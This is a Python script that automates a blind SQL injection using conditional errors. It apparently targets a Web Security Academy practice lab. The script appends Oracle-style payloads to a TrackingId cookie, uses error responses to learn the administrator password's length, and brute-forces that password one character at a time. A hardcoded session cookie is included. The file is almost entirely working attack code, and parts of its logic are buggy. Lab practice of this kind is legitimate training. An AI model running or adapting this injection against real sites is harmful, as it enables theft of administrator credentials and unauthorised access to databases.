import requests

url1 = 'https://0a0400e70411842b80a1714f00d300de.web-security-academy.net/'
session = requests.Session()
org_track_id = "awjYhMzhxCuu8axd"
char_set = "abcdefghijklmnopqrstuvwxyz0123456789"
sessiona = "m49g5xbqaj1nnjizk49ujr64xinz3nrr"
min_pass_length = 1
max_pass_length = 50

cookies = {
    'TrackingId': org_track_id,
    'session': sessiona
}


def stick_to_track_id(cookies, payload):
    cookies['TrackingId'] += "'" + payload 
    return cookies


def welcome_state(res):
    if 'conditional' in res.text:
        return True
    else :
        return False


def find_password_length(username,cookies, track_id):
    print('Starting to find password length')
    for password in range(min_pass_length, max_pass_length):
        query = f"|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>{password}) || '"
        # ||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        cookies = stick_to_track_id(cookies, query)
        print(cookies)
        session.cookies.update(cookies)
        response = session.get(url1)
        print(response.status_code)
        if  not welcome_state(response):
            cookies['TrackingId'] = track_id
        else:
            print(f"\nPassword Length:{password}")
            return password


def find_user_password(username, cookies, track_id):
    password_length = 20
    print(password_length)
    final_password = ""
    for char_number in range(1,password_length+1):
        for carachter in char_set:
            query = f"||(SELECT CASE WHEN SUBSTR(password,{char_number},1)='{carachter}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            print(f"\r\x1b[KRequested Query = {query}", end="")
            cookies = stick_to_track_id(cookies, query)
            session.cookies.update(cookies)
            response = session.get(url1)
            if  welcome_state(response):
                cookies['TrackingId'] = track_id
            if response.status_code == 500:
                final_password += carachter
                print(f"Password Founded: {final_password}")
                cookies['TrackingId'] = track_id
                if len(final_password) == password_length :
                    return final_password

find_user_password('administrator', cookies, org_track_id)

